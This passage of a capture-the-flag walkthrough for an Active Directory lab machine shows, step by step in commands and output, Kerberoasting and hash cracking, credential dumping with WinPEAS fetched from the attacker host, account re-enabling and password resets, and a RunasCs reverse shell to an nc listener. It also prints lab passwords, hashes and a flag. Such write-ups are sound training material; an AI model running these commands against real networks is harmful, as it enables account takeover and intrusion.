fcoomans@kali:~/htb/mirage/nats-0.2.4-linux-amd64$ ./nats stream view --server 10.10.11.78:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!'
? Select a Stream auth_logs
[1] Subject: logs.auth Received: 2025-05-05 09:18:56
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


[2] Subject: logs.auth Received: 2025-05-05 09:19:24
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


[3] Subject: logs.auth Received: 2025-05-05 09:19:25
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


[4] Subject: logs.auth Received: 2025-05-05 09:19:26
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


[5] Subject: logs.auth Received: 2025-05-05 09:19:27
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


05:48:09 Reached apparent end of data
```

### 💰 Post Exploitation

#### 👣 Foothold as David Jjackson

NetExec (`nxc`) confirmed that these were valid domain credentials.  This also shows that NTLM was disabled and that Kerberos authentication should be used.

```
fcoomans@kali:~/htb/mirage/nats-0.2.4-linux-amd64$ nxc smb dc01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -k
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
```

## 🍖 Kerberoasting Nathan Aadam

### 🔎 Recon

I used David's credentials to perform Active Directory (AD) recon.  

I used NetExec (`nxc`) to get a list of domain users.

```
fcoomans@kali:~/htb/mirage$ nxc ldap dc01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -k --users
LDAP        dc01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb)
LDAP        dc01.mirage.htb 389    DC01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
LDAP        dc01.mirage.htb 389    DC01             [*] Enumerated 10 domain users: mirage.htb
LDAP        dc01.mirage.htb 389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        dc01.mirage.htb 389    DC01             Administrator                 2025-06-23 23:18:18 0        Built-in account for administering the computer/domain
LDAP        dc01.mirage.htb 389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        dc01.mirage.htb 389    DC01             krbtgt                        2025-05-01 09:42:23 0        Key Distribution Center Service Account
LDAP        dc01.mirage.htb 389    DC01             Dev_Account_A                 2025-05-27 16:05:12 1
LDAP        dc01.mirage.htb 389    DC01             Dev_Account_B                 2025-05-02 10:28:11 1
LDAP        dc01.mirage.htb 389    DC01             david.jjackson                2025-05-02 10:29:50 0
LDAP        dc01.mirage.htb 389    DC01             javier.mmarshall              2025-07-24 04:31:53 0        Contoso Contractors
LDAP        dc01.mirage.htb 389    DC01             mark.bbond                    2025-06-23 23:18:18 0
LDAP        dc01.mirage.htb 389    DC01             nathan.aadam                  2025-06-23 23:18:18 0
LDAP        dc01.mirage.htb 389    DC01             svc_mirage                    2025-05-22 22:37:45 0        Old service account migrated by contractors
```

As well as groups and group membership.  `nathan_aadams` was a high priority target, as that account was a member of the `Remote Management Users` group.  Access to that account would give me WinRM (`evil-winrm`) access to the server.

```
fcoomans@kali:~/htb/mirage$ nxc ldap dc01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -k --groups |grep -v "membercount: 0"
LDAP                     dc01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb)
LDAP                     dc01.mirage.htb 389    DC01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
LDAP                     dc01.mirage.htb 389    DC01             Administrators                           membercount: 3
LDAP                     dc01.mirage.htb 389    DC01             Users                                    membercount: 3
LDAP                     dc01.mirage.htb 389    DC01             Guests                                   membercount: 2
LDAP                     dc01.mirage.htb 389    DC01             IIS_IUSRS                                membercount: 1
LDAP                     dc01.mirage.htb 389    DC01             Certificate Service DCOM Access          membercount: 1
LDAP                     dc01.mirage.htb 389    DC01             Remote Management Users                  membercount: 1
LDAP                     dc01.mirage.htb 389    DC01             Schema Admins                            membercount: 1
LDAP                     dc01.mirage.htb 389    DC01             Enterprise Admins                        membercount: 1
LDAP                     dc01.mirage.htb 389    DC01             Cert Publishers                          membercount: 1
LDAP                     dc01.mirage.htb 389    DC01             Domain Admins                            membercount: 1
LDAP                     dc01.mirage.htb 389    DC01             Group Policy Creator Owners              membercount: 1
LDAP                     dc01.mirage.htb 389    DC01             Pre-Windows 2000 Compatible Access       membercount: 2
LDAP                     dc01.mirage.htb 389    DC01             Windows Authorization Access Group       membercount: 1
LDAP                     dc01.mirage.htb 389    DC01             Denied RODC Password Replication Group   membercount: 8
LDAP                     dc01.mirage.htb 389    DC01             Development Team                         membercount: 2
LDAP                     dc01.mirage.htb 389    DC01             IT_Admins                                membercount: 1
LDAP                     dc01.mirage.htb 389    DC01             Exchange_Admins                          membercount: 1
LDAP                     dc01.mirage.htb 389    DC01             IT_Support                               membercount: 1
LDAP                     dc01.mirage.htb 389    DC01             IT_Contractors                           membercount: 1

fcoomans@kali:~/htb/mirage$ nxc ldap dc01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -k --groups Administrators
LDAP        dc01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb)
LDAP        dc01.mirage.htb 389    DC01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
LDAP        dc01.mirage.htb 389    DC01             Domain Admins
LDAP        dc01.mirage.htb 389    DC01             Enterprise Admins
LDAP        dc01.mirage.htb 389    DC01             Administrator

fcoomans@kali:~/htb/mirage$ nxc ldap dc01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -k --groups "Development Team"
LDAP        dc01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb)
LDAP        dc01.mirage.htb 389    DC01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
LDAP        dc01.mirage.htb 389    DC01             Dev_Account_B
LDAP        dc01.mirage.htb 389    DC01             Dev_Account_A

fcoomans@kali:~/htb/mirage$ nxc ldap dc01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -k --groups "Remote Management Users"
LDAP        dc01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb)
LDAP        dc01.mirage.htb 389    DC01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
LDAP        dc01.mirage.htb 389    DC01             IT_Admins

fcoomans@kali:~/htb/mirage$ nxc ldap dc01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -k --groups "IT_Admins"
LDAP        dc01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb)
LDAP        dc01.mirage.htb 389    DC01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
LDAP        dc01.mirage.htb 389    DC01             nathan.aadam

fcoomans@kali:~/htb/mirage$ nxc ldap dc01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -k --groups "Exchange_Admins"
LDAP        dc01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb)
LDAP        dc01.mirage.htb 389    DC01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
LDAP        dc01.mirage.htb 389    DC01             nathan.aadam

fcoomans@kali:~/htb/mirage$ nxc ldap dc01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -k --groups "IT_Support"
LDAP        dc01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb)
LDAP        dc01.mirage.htb 389    DC01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
LDAP        dc01.mirage.htb 389    DC01             mark.bbond

fcoomans@kali:~/htb/mirage$ nxc ldap dc01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -k --groups "IT_contractors"
LDAP        dc01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb)
LDAP        dc01.mirage.htb 389    DC01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
LDAP        dc01.mirage.htb 389    DC01             javier.mmarshall
```

The password policy showed that accounts would be locked out for 1 minute after 10 incorrect attempts.  This meant that brute-forcing, while still possible had to be controlled to less than 10 attempts, wait for 1 minute and continue.

```
fcoomans@kali:~/htb/mirage$ nxc smb dc01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -k --pass-pol
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
SMB         dc01.mirage.htb 445    dc01             [+] Dumping password info for domain: MIRAGE
SMB         dc01.mirage.htb 445    dc01             Minimum password length: 7
SMB         dc01.mirage.htb 445    dc01             Password history length: 24
SMB         dc01.mirage.htb 445    dc01             Maximum password age: 41 days 23 hours 53 minutes
SMB         dc01.mirage.htb 445    dc01
SMB         dc01.mirage.htb 445    dc01             Password Complexity Flags: 001001
SMB         dc01.mirage.htb 445    dc01                 Domain Refuse Password Change: 0
SMB         dc01.mirage.htb 445    dc01                 Domain Password Store Cleartext: 0
SMB         dc01.mirage.htb 445    dc01                 Domain Password Lockout Admins: 1
SMB         dc01.mirage.htb 445    dc01                 Domain Password No Clear Change: 0
SMB         dc01.mirage.htb 445    dc01                 Domain Password No Anon Change: 0
SMB         dc01.mirage.htb 445    dc01                 Domain Password Complex: 1
SMB         dc01.mirage.htb 445    dc01
SMB         dc01.mirage.htb 445    dc01             Minimum password age: 1 day 4 minutes
SMB         dc01.mirage.htb 445    dc01             Reset Account Lockout Counter: 1 minute
SMB         dc01.mirage.htb 445    dc01             Locked Account Duration: 1 minute
SMB         dc01.mirage.htb 445    dc01             Account Lockout Threshold: 10
SMB         dc01.mirage.htb 445    dc01             Forced Log off Time: Not Set
```

`ntpdate` was used to sync the attack host's time with the server.

```
fcoomans@kali:~/htb/mirage$ sudo ntpdate dc01.mirage.htb
2025-07-24 06:01:47.251426 (+0200) +32.970350 +/- 0.076820 dc01.mirage.htb 10.10.11.78 s1 no-leap
CLOCK: time stepped by 32.970350
```

And `bloodhound-python` was used to collect domain information.  The results were ingested into BloodHound.

```
fcoomans@kali:~/htb/mirage$ bloodhound-python --zip -ns 10.10.11.78 -d mirage.htb -c All --dns-tcp -u david.jjackson -p 'pN8kQmn6b86!1234@' -k
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: mirage.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.mirage.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.mirage.htb
INFO: Found 12 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 21 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.mirage.htb
INFO: Done in 00M 35S
INFO: Compressing output into 20250724060356_bloodhound.zip
```

Bloodhound showed that `nathan.aadam` was Kerberoastable.

![](images/Pasted%20image%2020251122082107.png)

### 🧪 Exploitation

`impacket-GetUserSPNs` was used to get the hash for Nathan.

```
fcoomans@kali:~/htb/mirage$ impacket-GetUserSPNs -dc-host dc01.mirage.htb -outputfile hashes.kerberoast -k 'mirage.htb/david.jjackson:pN8kQmn6b86!1234@'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName      Name          MemberOf                                                             PasswordLastSet             LastLogon                   Delegation
------------------------  ------------  -------------------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/exchange.mirage.htb  nathan.aadam  CN=Exchange_Admins,OU=Groups,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb  2025-06-23 23:18:18.584667  2025-07-24 05:26:59.915589
```

The hash was `etype 23` and on older versions (before version 7) `hashcat --help |grep -i tgs` shows that mode `13100` should be used to crack this hash.

```
fcoomans@kali:~/htb/mirage$ cat hashes.kerberoast 
$krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb/nathan.aadam*$9c39c57f68e84022176d403f2108ecf6$9c204f58028e8d2e5bd35c31e7b25f4410a9010e3ed9c8d8370be3a2e48d0b60b28c1a9e3ce3cfae8952e90ced0bbfdcfd77e471d08949c868e806412816ea4e6f598bd44e4103b66f9bb054a070494e720a8ede0cd5a79dec484dec4828872d114b98184b70d85c98c51456ccdbd88a25ee6f4db025c3e5f8b63fcf389a36f750d772c29c73158c68406c6ae0efa5d24f6fa9794e6<SNIP>

fcoomans@kali:~/htb/mirage$ hashcat --help |grep -i tgs
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
```

`hashcat --identify` simplifies this process on later versions (version 7 and later) of `hashcat`.

```
fcoomans@kali:~/htb/mirage$ hashcat --identify hashes.kerberoast
The following hash-mode match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
```

`hashcat` is used with mode `13100` to crack the hash using the `rockyou.txt` wordlist.  Nathan's password was `3edc#EDC3`.

```
fcoomans@kali:~/htb/mirage$ hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

$krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb/nathan.aadam*$664d0eb1df0351be873de849ff847230$37f854810e0193af2007aa9334b7358320e6570fbef4bd6a320d5fb7381f83aa37ad923d637cbe5c533e1da7313d74d4ffde5f3357369a5b7824413cdc82ddf554050fddd3b24169865a760f5f6f93b597525997d3875ad87a506e07695e4e9bc813e98d00f7a43b11282caff076f404c7510bda80bd4bfaba9faeb9bc9e857df184da1c887eacb428e0c38f3494003538163a65ef6a071aa99efb701fe9c<SNIP>:3edc#EDC3

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb/nat...6734b5

<SNIP>
```

#### 🔼 PrivEsc to Nathan Aadam

NetExec (`nxc`) confirmed that this password was valid.

```
fcoomans@kali:~/htb/mirage$ nxc smb dc01.mirage.htb -u nathan.aadam -p '3edc#EDC3' -k
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\nathan.aadam:3edc#EDC3
```

`impacket-getTGT` was used to get a Kerberos TGT for `nathan.aadam`.

```
fcoomans@kali:~/htb/mirage$ sudo ntpdate dc01.mirage.htb
2025-07-24 17:51:00.911143 (+0200) -86240.838564 +/- 0.079968 dc01.mirage.htb 10.10.11.78 s1 no-leap
CLOCK: time stepped by -86240.838564

fcoomans@kali:~/htb/mirage$ impacket-getTGT 'mirage.htb/nathan.aadam:3edc#EDC3'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in nathan.aadam.ccache

fcoomans@kali:~/htb/mirage$ export KRB5CCNAME=nathan.aadam.ccache

fcoomans@kali:~/htb/mirage$ klist
Ticket cache: FILE:nathan.aadam.ccache
Default principal: nathan.aadam@MIRAGE.HTB

Valid starting       Expires              Service principal
07/24/2025 17:56:26  07/25/2025 03:56:26  krbtgt/MIRAGE.HTB@MIRAGE.HTB
        renew until 07/25/2025 17:56:20
```

The Kerberos TGT was then used with `evil-winrm` to establish a remote connection to the target as user `nathan.aadam`.

```
fcoomans@kali:~/htb/mirage$ evil-winrm -i dc01.mirage.htb -r mirage.htb

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> whoami
mirage\nathan.aadam
```

### 💰 Post Exploitation

#### 🚩 user.txt

Nathan held the `user.txt` flag.

```
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> tree C:\Users /a /f
Folder PATH listing
Volume serial number is 000001EE 014F:FCE7
C:\USERS
+---Administrator
+---david.jjackson
+---Dev_Account_A
+---mark.bbond
+---nathan.aadam
|   +---3D Objects
|   +---Contacts
|   +---Desktop
|   |       Microsoft Edge.lnk
|   |       user.txt

<SNIP>
```

```
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> type C:\Users\nathan.aadam\Desktop\user.txt
b35ab77467399732745b08761fb65995
```

## 🕰️ LogonHours Restrictions

### 🔎 Recon

WinPEAS was shared using a Python web server,

```
fcoomans@kali:~/htb/mirage$ python -m http.server -d /usr/share/peass/winpeas
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

And downloaded on the target using `Invoke-WebRequest` (`iwr`).

```
PS C:\Users\nathan.aadam\AppData\Local\Temp> iwr http://10.10.14.113:8000/winPEASx64.exe -outfile winpeas.exe
iwr http://10.10.14.113:8000/winPEASx64.exe -outfile winpeas.exe
```

Running WinPEAS revealed the AutoLogon credentials for `mark.bbond`.  His password was `1day@atime`.

```
PS C:\Users\nathan.aadam\AppData\Local\Temp> .\winpeas.exe

<SNIP>

͹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  MIRAGE
    DefaultUserName               :  mark.bbond
    DefaultPassword               :  1day@atime

<SNIP>
```

#### 🔼 PrivEsc to Mark Bbond

NetExec (`nxc`) confirmed that the credentials are correct.

```
fcoomans@kali:~/htb/mirage$ nxc ldap dc01.mirage.htb -u mark.bbond -p '1day@atime' -k

LDAP        dc01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb)
LDAP        dc01.mirage.htb 389    DC01             [+] mirage.htb\mark.bbond:1day@atime
```

BloodHound showed that Mark, through his membership to the `IT_SUPPORT` group could change the password for `javier.mmarshall`.

![](images/Pasted%20image%2020251122085700.png)

But Javier's account was disabled.

![](images/Pasted%20image%2020251122085857.png)

### 🧪 Exploitation

#### 🔼 PrivEsc to Javier Mmarshall

I first enabled Javier's account using `bloodyAD`.

```
fcoomans@kali:~/htb/mirage$ bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u mark.bbond -p "1day@atime" get object javier.mmarshall --attr userAccountControl

distinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT

fcoomans@kali:~/htb/mirage$ bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u mark.bbond -p "1day@atime" remove uac javier.mmarshall -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from javier.mmarshall's userAccountControl

fcoomans@kali:~/htb/mirage$ bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u mark.bbond -p "1day@atime" get object javier.mmarshall --attr userAccountControl

distinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
userAccountControl: NORMAL_ACCOUNT
```

And then changed the account password.

```
fcoomans@kali:~/htb/mirage$ bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u mark.bbond -p "1day@atime" set password javier.mmarshall 'Password123!'
[+] Password changed successfully!
```

But, NetExec (`nxc`) still complained that Javier's account was revoked i.e., prevented from logging in!

```
fcoomans@kali:~/htb/mirage$ nxc smb dc01.mirage.htb -u javier.mmarshall -p Password123! -k
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [-] mirage.htb\javier.mmarshall:Password123! KDC_ERR_CLIENT_REVOKED
```

So, I did a comparison between Mark and Javier's AD Objects and found that Javier's logon hours was set to prevent Javier from logging in.  

```
fcoomans@kali:~/htb/mirage$ bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u mark.bbond -p "1day@atime" get object mark.bbond --attr logonHours

distinguishedName: CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb
logonHours: ////////////////////////////

fcoomans@kali:~/htb/mirage$ bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u mark.bbond -p "1day@atime" get object javier.mmarshall --attr logonHours

distinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
logonHours:
```

I spent quite a bit of time trying to set Javier's logon hours with `bloodyAD`, but just couldn't get it to work.  
I pivoted and decided to do it using Windows instead.  Mark was not a member of the Remote Management Users.  So, I couldn't just use `evil-winrm` to login with that account.  
I instead started a `nc` listener on port `4445` on the attack host.

```
fcoomans@kali:~/htb/mirage/www$ rlwrap nc -lvnp 4445
listening on [any] 4445 ...
```

And then launched a reverse (`-r`) Powershell (`powershell.exe`) as Mark using `RunasCs`.

```
PS C:\Users\nathan.aadam\AppData\Local\Temp> .\RunasCs.exe mark.bbond "1day@atime" powershell.exe -r 10.10.14.113:4445
.\RunasCs.exe mark.bbond "1day@atime" powershell.exe -r 10.10.14.113:4445
[*] Warning: The logon for user 'mark.bbond' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-70c4b8$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 6844 created in background.
```

The `nc` listener caught the Reverse Shell and I had access as `mark.bbond`.

```
fcoomans@kali:~/htb/mirage/www$ rlwrap nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.113] from (UNKNOWN) [10.10.11.78] 57161
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
mirage\mark.bbond
```

`Get-ADUser` showed that `logonHours` was configured to prevent Javier from logging in.

```
PS C:\Windows\system32> Get-ADUser -Identity javier.mmarshall
Get-ADUser -Identity javier.mmarshall


DistinguishedName : CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
Enabled           : True
GivenName         : javier.mmarshall
logonHours        : {0, 0, 0, 0...}
Name              : javier.mmarshall
ObjectClass       : user
ObjectGUID        : c52e731b-30c1-439c-a6b9-0c2f804e5f08
SamAccountName    : javier.mmarshall
SID               : S-1-5-21-2127163471-3824721834-2568365109-1108
Surname           :
UserPrincipalName : javier.mmarshall@mirage.htb
```

The `LogonHours` was cleared (`-Clear`) using the `Set-ADUser` ActiveDirectory cmdlet.  
I could also use `Enable-ADAccount` to enable the account.

```
PS C:\Windows\system32> Enable-ADAccount -Identity javier.mmarshall
Enable-ADAccount -Identity javier.mmarshall

PS C:\Windows\system32> Set-ADUser -Identity javier.mmarshall -Clear LogonHours
Set-ADUser -Identity javier.mmarshall -Clear LogonHours
```

Great, Javier could logon.

```
PS C:\Windows\system32> Get-ADUser -Identity javier.mmarshall -Properties logonHours
Get-ADUser -Identity javier.mmarshall -Properties logonHours


DistinguishedName : CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
Enabled           : True
GivenName         : javier.mmarshall
logonHours        : {255, 255, 255, 255...}
Name              : javier.mmarshall
ObjectClass       : user
ObjectGUID        : c52e731b-30c1-439c-a6b9-0c2f804e5f08
SamAccountName    : javier.mmarshall
SID               : S-1-5-21-2127163471-3824721834-2568365109-1108
Surname           :
UserPrincipalName : javier.mmarshall@mirage.htb
```

Just in case any automation scripts reset Javier's password, I decided to use `Set-ADAccountPassword` to reset the password.

```
PS C:\Windows\system32> Set-ADAccountPassword -Identity javier.mmarshall -NewPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
```

### 💰 Post Exploitation

NetExec (`nxc`) showed that Javier's account was active and working.

```
fcoomans@kali:~/htb/mirage$ nxc ldap dc01.mirage.htb -u javier.mmarshall -p Password123! -k
LDAP        dc01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb)
LDAP        dc01.mirage.htb 389    DC01             [+] mirage.htb\javier.mmarshall:Password123!
```

## 💳 ADCS ESC10

### 🔎 Recon

BloodHound showed that Javier could read the GMSA Password for the `MIRAGE-SERVICE$` account.

![](images/Pasted%20image%2020251122113750.png)

NetExec (`nxc`) was used to read the GMSA NTLM hash for the `Mirage-Service$` account.

```
fcoomans@kali:~/htb/mirage$ nxc ldap dc01.mirage.htb -u javier.mmarshall -p Password123! -k --gmsa
LDAP        dc01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb)
LDAPS       dc01.mirage.htb 636    DC01             [+] mirage.htb\javier.mmarshall:Password123!
LDAPS       dc01.mirage.htb 636    DC01             [*] Getting GMSA Passwords
LDAPS       dc01.mirage.htb 636    DC01             Account: Mirage-Service$      NTLM: 305806d84f7c1be93a07aaf40f0c7866     PrincipalsAllowedToReadPassword: javier.mmarshall
```

#### 🔼 PrivEsc to mirage-service$

And also confirmed that the NTLM hash was valid.

```
fcoomans@kali:~/htb/mirage$ nxc ldap dc01.mirage.htb -u Mirage-Service$ -H 305806d84f7c1be93a07aaf40f0c7866 -k
LDAP        dc01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb)
LDAP        dc01.mirage.htb 389    DC01             [+] mirage.htb\Mirage-Service$:305806d84f7c1be93a07aaf40f0c7866
```

I decided to run a `certipy-ad` vulnerability scan on the ADCS, since certificates were heavily used as shown during the initial recon.  
`impacket-getTGT` was used to to get a Kerberos TGT for the `MIRAGE-SERVICE$` service account.

```
fcoomans@kali:~/htb/mirage$ sudo ntpdate dc01.mirage.htb
[sudo] password for fcoomans:
2025-07-24 23:50:22.266002 (+0200) +285.285149 +/- 0.081327 dc01.mirage.htb 10.10.11.78 s1 no-leap
CLOCK: time stepped by 285.285149

fcoomans@kali:~/htb/mirage$ fcoomans@kali:~/htb/mirage$ impacket-getTGT -hashes :305806d84f7c1be93a07aaf40f0c7866 'mirage.htb/mirage-service$'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in mirage-service$.ccache

fcoomans@kali:~/htb/mirage$ export KRB5CCNAME=mirage-service\$.ccache

fcoomans@kali:~/htb/mirage$ klist
Ticket cache: FILE:mirage-service$.ccache
Default principal: mirage-service$@MIRAGE.HTB

Valid starting       Expires              Service principal
07/24/2025 23:50:30  07/25/2025 09:50:30  krbtgt/MIRAGE@MIRAGE.HTB
        renew until 07/25/2025 23:50:29
```

And a `certipy-ad find` was run.

```
fcoomans@kali:~/htb/mirage$ certipy-ad find -k -ns 10.10.11.78 -target dc01.mirage.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'mirage-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'mirage-DC01-CA'
[*] Checking web enrollment for CA 'mirage-DC01-CA' @ 'dc01.mirage.htb'
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250725000159_Certipy.txt'
[*] Wrote text output to '20250725000159_Certipy.txt'
[*] Saving JSON output to '20250725000159_Certipy.json'
[*] Wrote JSON output to '20250725000159_Certipy.json'
```

The output files were reviewed and only showed some minor escalations.

```
fcoomans@kali:~/htb/mirage$ cat 20250725000159_Certipy.txt

<SNIP>

  19
    Template Name                       : Machine
    Display Name                        : Computer
    Certificate Authorities             : mirage-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-05-01T07:53:41+00:00
    Template Last Modified              : 2025-05-01T07:53:41+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : MIRAGE.HTB\Domain Admins
                                          MIRAGE.HTB\Domain Computers
                                          MIRAGE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : MIRAGE.HTB\Enterprise Admins
        Full Control Principals         : MIRAGE.HTB\Domain Admins
                                          MIRAGE.HTB\Enterprise Admins
        Write Owner Principals          : MIRAGE.HTB\Domain Admins
                                          MIRAGE.HTB\Enterprise Admins
        Write Dacl Principals           : MIRAGE.HTB\Domain Admins
                                          MIRAGE.HTB\Enterprise Admins
        Write Property Enroll           : MIRAGE.HTB\Domain Admins
                                          MIRAGE.HTB\Domain Computers
                                          MIRAGE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : MIRAGE.HTB\Domain Computers
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.

<SNIP>
```

